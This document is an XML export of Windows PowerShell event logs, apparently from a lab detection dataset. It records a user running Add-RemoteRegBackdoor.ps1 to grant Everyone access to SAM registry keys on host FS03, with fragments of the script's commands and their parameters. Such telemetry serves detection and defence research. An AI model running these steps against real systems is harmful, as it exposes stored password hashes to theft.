	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Trustee"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54762</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1127

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SAM\SAM\Domains\Account] Applying Trustee to new Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54763</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1129

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54764</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1131

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SAM\SAM\Domains\Account] Backdooring completed for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54765</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>        Write-Verbose "[$Computer] Backdooring completed for system"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1133

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=        Write-Verbose "[$Computer] Backdooring completed for system"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03] Backdooring completed for system"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54766</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>        $Out = New-Object PSObject  
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1135

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=        $Out = New-Object PSObject  
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="PSObject"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54767</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>        $Out | Add-Member Noteproperty 'ComputerName' $Computer
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1137

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=        $Out | Add-Member Noteproperty 'ComputerName' $Computer
</Data>
      <Data>CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ComputerName"
ParameterBinding(Add-Member): name="Value"; value="FS03"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54768</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1139

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee
</Data>
      <Data>CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="BackdoorTrustee"
ParameterBinding(Add-Member): name="Value"; value="S-1-1-0"
ParameterBinding(Add-Member): name="InputObject"; value="@{ComputerName=FS03}"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54769</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>
      </Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1141

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=
	CommandLine=</Data>
      <Data>CommandInvocation(Out-Default): "Out-Default"
ParameterBinding(Out-Default): name="InputObject"; value="@{ComputerName=FS03; BackdoorTrustee=S-1-1-0}"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4104</EventID>
      <Version>1</Version>
      <Level>5</Level>
      <Task>102</Task>
      <Opcode>15</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.261428600Z" />
      <EventRecordID>68900</EventRecordID>
      <Correlation ActivityID="{3f0c7a49-e4fd-0001-7cd0-343ffde4d701}" />
      <Execution ProcessID="4960" ThreadID="2608" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1234" />
    </System>
    <EventData>
      <Data Name="MessageNumber">1</Data>
      <Data Name="MessageTotal">1</Data>
      <Data Name="ScriptBlockText">Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0'</Data>
      <Data Name="ScriptBlockId">29a865ee-6911-418f-be84-57e7a06f5129</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4103</EventID>
      <Version>1</Version>
      <Level>4</Level>
      <Task>106</Task>
      <Opcode>20</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.261428600Z" />
      <EventRecordID>68901</EventRecordID>
      <Correlation ActivityID="{3f0c7a49-e4fd-0000-3128-353ffde4d701}" />
      <Execution ProcessID="4960" ThreadID="2608" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1234" />
    </System>
    <EventData>
      <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 4.0
        Host ID = a991c134-2e90-418c-940d-258271dd1e9c
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 4.0
        Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4
        Pipeline ID = 88
        Command Name = Write-Verbose
        Command Type = Cmdlet
        Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1
        Command Path = 
        Sequence Number = 1014
        User = OFFSEC\hack1
        Shell ID = Microsoft.PowerShell
</Data>
      <Data Name="UserData">
      </Data>
      <Data Name="Payload">CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : ] Using trustee username 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4103</EventID>
      <Version>1</Version>
      <Level>4</Level>
      <Task>106</Task>
      <Opcode>20</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.370792400Z" />
      <EventRecordID>68902</EventRecordID>
      <Correlation ActivityID="{3f0c7a49-e4fd-0000-3228-353ffde4d701}" />
      <Execution ProcessID="4960" ThreadID="2608" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1234" />
    </System>
    <EventData>
      <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 4.0
        Host ID = a991c134-2e90-418c-940d-258271dd1e9c
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 4.0
        Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4
        Pipeline ID = 88
        Command Name = Get-WmiObject
        Command Type = Cmdlet
        Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1
        Command Path = 
        Sequence Number = 1016
        User = OFFSEC\hack1
        Shell ID = Microsoft.PowerShell
</Data>
      <Data Name="UserData">
      </Data>
      <Data Name="Payload">CommandInvocation(Get-WmiObject): "Get-WmiObject"
ParameterBinding(Get-WmiObject): name="Class"; value="Win32_Service"
ParameterBinding(Get-WmiObject): name="Filter"; value="name='RemoteRegistry'"
ParameterBinding(Get-WmiObject): name="ComputerName"; value="FS03"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4103</EventID>
      <Version>1</Version>
      <Level>4</Level>
      <Task>106</Task>
      <Opcode>20</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.370792400Z" />
      <EventRecordID>68903</EventRecordID>
      <Correlation ActivityID="{3f0c7a49-e4fd-0000-3328-353ffde4d701}" />
      <Execution ProcessID="4960" ThreadID="2608" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1234" />
    </System>
    <EventData>
      <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 4.0
        Host ID = a991c134-2e90-418c-940d-258271dd1e9c
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 4.0
        Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4
        Pipeline ID = 88
        Command Name = Write-Verbose
        Command Type = Cmdlet
        Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1
        Command Path = 
        Sequence Number = 1018
        User = OFFSEC\hack1
        Shell ID = Microsoft.PowerShell
</Data>
      <Data Name="UserData">
      </Data>
      <Data Name="Payload">CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03] Attaching to remote registry through StdRegProv"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4103</EventID>
      <Version>1</Version>
      <Level>4</Level>
      <Task>106</Task>
      <Opcode>20</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.370792400Z" />
      <EventRecordID>68904</EventRecordID>
      <Correlation ActivityID="{3f0c7a49-e4fd-0000-3428-353ffde4d701}" />
      <Execution ProcessID="4960" ThreadID="2608" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1234" />
    </System>
    <EventData>
      <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 4.0
        Host ID = a991c134-2e90-418c-940d-258271dd1e9c
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 4.0
        Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4
        Pipeline ID = 88
        Command Name = Get-WmiObject
        Command Type = Cmdlet
        Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1
        Command Path = 
        Sequence Number = 1020
        User = OFFSEC\hack1
        Shell ID = Microsoft.PowerShell
</Data>
      <Data Name="UserData">
      </Data>
      <Data Name="Payload">CommandInvocation(Get-WmiObject): "Get-WmiObject"
ParameterBinding(Get-WmiObject): name="Namespace"; value="root/default"
ParameterBinding(Get-WmiObject): name="Class"; value="Meta_Class"
ParameterBinding(Get-WmiObject): name="Filter"; value="__CLASS = 'StdRegProv'"
ParameterBinding(Get-WmiObject): name="ComputerName"; value="FS03"
</Data>
    </EventData>
  </Event>
  